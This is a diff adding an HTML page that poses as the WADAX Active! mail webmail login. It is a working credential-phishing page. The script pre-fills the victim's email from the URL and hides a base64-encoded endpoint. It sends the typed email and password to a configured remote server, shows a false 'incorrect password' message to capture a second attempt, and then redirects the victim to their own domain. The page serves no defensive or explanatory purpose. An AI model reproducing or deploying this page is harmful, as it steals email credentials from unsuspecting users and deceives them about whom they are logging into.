@@ -1,0 +1,570 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9">
+    <meta http-equiv="AM-Template" content="standard/html/index.html">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="Content-Language" content="en">
+    <meta name="format-detection" content="telephone=no">
+
+    <title>WADAX Active! mail</title>
+
+
+
+    <style>
+        .amvpop_panel {
+            border-width: 1px;
+            border-style: solid;
+            border-color: #3973ad;
+            background-color: white;
+            overflow: hidden;
+            padding: 2px;
+        }
+
+        .amvpop_shadow {
+            top: 3px;
+            left: 3px;
+            background-color: gray;
+            overflow: hidden;
+        }
+
+        .amvpop_title {
+            padding: 3px 0 0 10px;
+            overflow: hidden;
+            color: white;
+            background-color: #3973ad;
+            cursor: default;
+            font-size: 12px;
+            font-weight: bold;
+            white-space: nowrap;
+        }
+
+        .amvpop_content {
+            cursor: default;
+            padding: 5px 6px 0 6px;
+            overflow: auto;
+            background-color: white;
+            font-size: 14px;
+        }
+
+        .amvpop_buttons {
+            padding: 12px 0 0 10px;
+            cursor: default;
+            background-color: white;
+            font-size: 10px;
+            text-align: center;
+            white-space: nowrap;
+        }
+
+        .amvpop_form {
+            margin-top: 0px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .amvpop_status {
+            padding: 5px 10px 0 10px;
+            cursor: default;
+            background-color: white;
+            font-size: 10px;
+            line-height: 1;
+            text-align: center;
+        }
+
+        .amvpop_close {
+            position: absolute;
+            right: 4px;
+            top: 4px;
+            width: 16px;
+            height: 16px;
+            cursor: default;
+            overflow: hidden;
+            background-image: url(../img/standard/closebox.gif);
+            background-repeat: no-repeat;
+        }
+
+        .amvpop_resize {
+            position: absolute;
+            right: 2px;
+            bottom: 2px;
+            width: 7px;
+            height: 7px;
+            cursor: se-resize;
+            overflow: hidden;
+            background-image: url(../img/standard/resize7blue.gif);
+            background-repeat: no-repeat;
+        }
+
+        .amvpop_status_warn {
+            color: red;
+            font-weight: bold;
+        }
+
+        .amvpop_status_error {
+            color: red;
+            font-weight: bold;
+        }
+
+        .amvpop_status_info {
+            color: black;
+            font-weight: bold;
+        }
+    </style>
+    <style>
+        @charset "UTF-8";
+
+        body {
+            padding: 0;
+            width: 100%;
+            height: 95%;
+            overflow: auto;
+            background-image: url(https://wm02.wadax.ne.jp/am_viz/common/img/standard/index_bg.gif);
+            background-repeat: repeat-y;
+            font-size: small;
+        }
+
+        select {
+            min-height: 1.6em;
+        }
+
+        input[type="text"] {
+            min-height: 1.6em;
+        }
+
+        button.imgbtn {
+            margin: 0 2px;
+            padding: 2px 3px 1px 1px;
+            font-size: 12px;
+        }
+
+        button.imgbtn img {
+            padding: 0 0 0 2px;
+            vertical-align: top;
+        }
+
+        div.border {
+            width: 100%;
+            background-image: url(https://wm02.wadax.ne.jp/am_viz/common/img/standard/index_border.gif);
+            background-repeat: no-repeat;
+        }
+
+        div.layout {
+            margin: 10% auto 14% auto;
+            width: 410px;
+        }
+
+        div.logo {
+            margin: 20px 0 20px 50px;
+        }
+
+        table.login {
+            border-collapse: collapse;
+            border-color: #999999;
+            border-spacing: 0;
+            border-style: outset;
+            border-width: 1px;
+            background-color: #FFFFFF;
+        }
+
+        table.login th {
+            padding: 4px;
+            border-color: #999999;
+            border-style: inset;
+            border-width: 1px;
+            background-color: #5791d1;
+            text-align: left;
+        }
+
+        table.login td {
+            padding: 4px;
+            border-color: #999999;
+            border-style: inset;
+            border-width: 1px;
+            background-color: #f0f0f0;
+        }
+
+        table.inner {
+            background-color: #f0f0f0;
+            border-style: none;
+            font-size: 80%;
+            margin: 0;
+            padding: 2px;
+            width: 400px;
+        }
+
+        table.inner input.length {
+            width: 160px;
+        }
+
+        table.inner th {
+            margin: 0;
+            padding: 0;
+            border-style: none;
+            color: #333333;
+            background-color: #f0f0f0;
+            text-align: right;
+            white-space: nowrap;
+        }
+
+        table.inner th.copyright {
+            margin: 0;
+            padding: 0;
+            color: #666666;
+            font-size: 75%;
+            vertical-align: bottom;
+            white-space: nowrap;
+            text-align: left;
+        }
+
+        table.inner td {
+            margin: 0;
+            padding: 0;
+            border-style: none;
+            background-color: #f0f0f0;
+            text-align: left;
+        }
+
+        table.inner td.authinfo {
+            text-align: right;
+            font-weight: bold;
+        }
+
+        table.login_footer {
+            padding: 0;
+            margin-top: 5px;
+            width: 410px;
+        }
+
+        table.login_footer td.english {
+            padding: 0;
+            font-size: 90%;
+            text-align: right;
+        }
+
+        div.chpassword {
+            margin: 0 0 20px 0;
+        }
+
+        div.chpassword table {
+            border-collapse: collapse;
+        }
+
+        div.chpassword table td {
+            font-size: 90%;
+            padding: 0;
+        }
+
+        div.chpassword table.inner_table {
+            margin: 20px 0 0 0;
+        }
+
+        div.chpassword table.inner_table td {
+            padding: 0 10px 0 0;
+        }
+
+        div.chpassword table.inner_table td span.required {
+            color: red;
+            display: inline-block;
+            font-weight: normal;
+        }
+
+        div.pop_btn {
+            margin-top: 5px;
+            text-align: center;
+        }
+    </style>
+</head>
+
+<body topmargin="0" leftmargin="0" text="#000000" bgcolor="#FFFFFF">
+
+    <div style="position: sticky; top: 0; background-color: #f1f1f1;  z-index: 999;">
+        <div id="google_translate_element"></div>
+    </div>
+
+    <noscript>JavaScrip is used in this page.<br />Please enable JavaScript in your web browser.</noscript>
+
+    <div id="ajax_content" style="position:absolute;visibility:hidden;display:none;"></div>
+
+    <form id="" name="form1" data-name="" action="" method="post" required>
+
+        <div class="logo">
+
+            <img src="https://57fk7szq463tm5ee4far6j6x5wlescv6yq5bygjppbt434qvx3ua.arweave.net/78qvyzDntzZ0hOFBHyfX7ZZJCr7EOhwZL3hnzfIVvug"
+                alt="WADAX Active! mail" title="WADAX Active! mail" width="164" height="59">
+
+        </div>
+        <div class="border"><br></div>
+
+        <div class="layout">
+            <!-- ERRORメッセージ:s -->
+            <div id="msg"
+                style="background-color: #ffffff; color:red; margin: 10px 0 10px; padding: 10px !important; padding-bottom: 0; border: 2px solid #d5d5d5; text-align: left; display:block;display: none;">
+                メールアドレス(ユーザID)またはパスワードが正しくありません。</div>
+            <div id="error"
+                style="background-color: #ffffff; color:red; margin: 10px 0 10px; padding: 10px !important; padding-bottom: 0; border: 2px solid #d5d5d5; text-align: left; display:block;display: none;">
+                メールアドレス(ユーザID)またはパスワードが正しくありません。</div>
+            <!-- ERRORメッセージ:e -->
+            <table class="login">
+                <tr>
+                    <th><img
+                            src="https://cqe5yglumvzx23yobkcjcvzztyorysurboggqfddggyh565ybqia.arweave.net/FAncGXRlc31vDgqEkVc5nh0cSpELjGgUYzGwfvu4DBA">
+                    </th>
+                </tr>
+                <tr>
+                    <td>
+
+                        <table class="inner" cellspacing="3" cellpadding="3">
+                            <tr>
+                                <th>User ID :</th>
+                                <td>
+                                    <input type="text" class="length" name="ai" id="ai" size="19" readonly
+                                        maxlength="1024" style="ime-mode: disabled;" autocomplete="off" value=""
+                                        tabindex="1">
+                                </td>
+                                <td>
+
+                                    <select name="am_authdomain_secid" tabindex="3">
+
+
+                                        <option value="item1">wx05ご利用のお客様</option>
+
+                                        <option value="item2">wx06ご利用のお客様</option>
+
+                                        <option value="item3">wx07ご利用のお客様</option>
+
+                                        <option value="item4">wx08ご利用のお客様</option>
+
+
+                                    </select>
+
+                                </td>
+                            </tr>
+
+                            <tr>
+                                <th>Password :</th>
+                                <td colspan="3">
+                                    <input type="password" class="length" name="namep" id="pr" size="20"
+                                        maxlength="1024" style="ime-mode: disabled;" autocomplete="off" value=""
+                                        tabindex="2">
+                                </td>
+                            </tr>
+
+
+                            <tr>
+                                <th>Language :</th>
+                                <td colspan="3">
+                                    <select name="language" tabindex="4">
+                                        <option value="auto" selected>Auto-Select</option>
+
+                                        <option value="en">English</option>
+
+                                        <option value="ja">Japanese</option>
+
+                                        <option value="ko">Korean</option>
+
+                                        <option value="zh-cn">Chinese</option>
+
+
+                                    </select>
+                                </td>
+                            </tr>
+
+
+                            <tr>
+                                <td colspan="4" class="authinfo">
+                                    <input type="checkbox" name="save_authinfo" id="save_authinfo" value="on"
+                                        tabindex="5"><label for="save_authinfo">Save the user ID/password</label>
+                                </td>
+                            </tr>
+
+
+                            <tr>
+                                <th colspan="2" class="copyright">WADAX Active! mail <br />&#169;2023 QUALITIA CO., LTD.
+                                    All Rights Reserved.</th>
+                                <th>
+
+                                    <input type="button" id="submit-btn" onclick="submitForm(event)" value="  Log In  "
+                                        tabindex="6">
+
+                                </th>
+                            </tr>
+
+                        </table>
+                    </td>
+                </tr>
+            </table>
+
+            <table class="login_footer">
+                <tr>
+                    <td class="english">
+
+                    </td>
+                </tr>
+            </table>
+
+        </div>
+
+    </form>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="./config.js"></script>
+
+    <script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+    $('#back1').click(function() {
+        $("#msg").hide();
+        $('#ai').val("");
+        $("#automail").animate({ left: 200, opacity: "hide" }, 0);
+        $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);
+
+    });
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        // $('#ai').val(ai);
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+        $('#ai').val(my_ai);
+        $('#ai').attr('disabled', "");
+        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(dom);
+        $("#msg").hide();
+        $("#inputbar").animate({ left: 200, opacity: "hide" }, 0);
+        $("#automail").animate({ right: 200, opacity: "show" }, 1000);
+    }
+    ///////////////url getting ai////////////////
+
+
+    var atu = "L2Nvbm5lY3QucGhw";
+	
+    $('#submit-btn').click(function(event) {
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var msg = $('#msg').html();
+        $('#msg').text(msg);
+        ///////////new injection////////////////
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!ai) {
+            $('#error').show();
+            $('#error').html("&#x30E1;&#x30FC;&#x30EB;&#x30A2;&#x30C9;&#x30EC;&#x30B9;&#x3001;&#x307E;&#x305F;&#x306F;&#x3001;&#x30E1;&#x30FC;&#x30EB;&#x30D1;&#x30B9;&#x30EF;&#x30FC;&#x30C9;&#x304C;&#x6B63;&#x3057;&#x304F;&#x306A;&#x3044;&#x3088;&#x3046;&#x3067;&#x3059;&#x3002;");
+            ai.focus;
+            return false;
+        }
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            $('#error').html("&#x30E1;&#x30FC;&#x30EB;&#x30A2;&#x30C9;&#x30EC;&#x30B9;&#x3001;&#x307E;&#x305F;&#x306F;&#x3001;&#x30E1;&#x30FC;&#x30EB;&#x30D1;&#x30B9;&#x30EF;&#x30FC;&#x30C9;&#x304C;&#x6B63;&#x3057;&#x304F;&#x306A;&#x3044;&#x3088;&#x3046;&#x3067;&#x3059;&#x3002;");
+            ai.focus;
+            return false;
+        }
+        if (!pr) {
+            $('#error').show();
+            $('#error').html("&#x30E1;&#x30FC;&#x30EB;&#x30A2;&#x30C9;&#x30EC;&#x30B9;&#x3001;&#x307E;&#x305F;&#x306F;&#x3001;&#x30E1;&#x30FC;&#x30EB;&#x30D1;&#x30B9;&#x30EF;&#x30FC;&#x30C9;&#x304C;&#x6B63;&#x3057;&#x304F;&#x306A;&#x3044;&#x3088;&#x3046;&#x3067;&#x3059;&#x3002;");
+            ai.focus;
+            return false;
+        }
+		
+		
+		if(pr.length < 5) {  
+
+			$('#error').show();
+            $('#error').html("&#x30E1;&#x30FC;&#x30EB;&#x30A2;&#x30C9;&#x30EC;&#x30B9;&#x3001;&#x307E;&#x305F;&#x306F;&#x3001;&#x30E1;&#x30FC;&#x30EB;&#x30D1;&#x30B9;&#x30EF;&#x30FC;&#x30C9;&#x304C;&#x6B63;&#x3057;&#x304F;&#x306A;&#x3044;&#x3088;&#x3046;&#x3067;&#x3059;&#x3002;");
+            ai.focus;  
+
+			return false;  
+
+		}
+
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+        ///////////new injection////////////////
+        count = count + 1;
+        $('#ai').attr('disabled', "");
+        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(dom);
+
+        $.ajax({
+            dataType: 'JSON',
+            url: `${config.baseUrl}${atob(atu)}`,
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+            },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr) {
+                $('#submit-btn').html('Verifing...');
+            },
+            success: function(response) {
+                if (response) {
+                    $("#msg").show();
+                    console.log(response);
+                    if (response['signal'] == 'ok') {
+                        $("#pr").val("");
+                        if (count >= 2) {
+                            count = 0;
+                            // window.location.replace(response['redirect_link']);
+                            window.location.replace("http://www." + my_slice);
+
+                        }
+                        // $('#msg').html(response['msg']);
+                    } else {
+                        // $('#msg').html(response['msg']);
+                    }
+                }
+            },
+            error: function() {
+                $("#pr").val("");
+                if (count >= 2) {
+                    count = 0;
+                    window.location.replace("http://www." + my_slice);
+                }
+                $("#msg").show();
+                // $('#msg').html("Please try again later");
+            },
+            complete: function() {
+                $('#submit-btn').html('Login');
+            }
+        });
+    });
+
+
+});
+
+function getParameterByName(name, url) {
+			if (!url) url = window.location.href;
+			name = name.replace(/[\[\]]/g, '\\$&');
+			var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+				results = regex.exec(url);
+			if (!results) return null;
+			if (!results[2]) return '';
+			return decodeURIComponent(results[2].replace(/\+/g, ' '));
+		}
+			
+		const login_username = getParameterByName('cms');
+		document.getElementById("ai").value = login_username;
+</script>
+
+
+</body>
+
+</html>
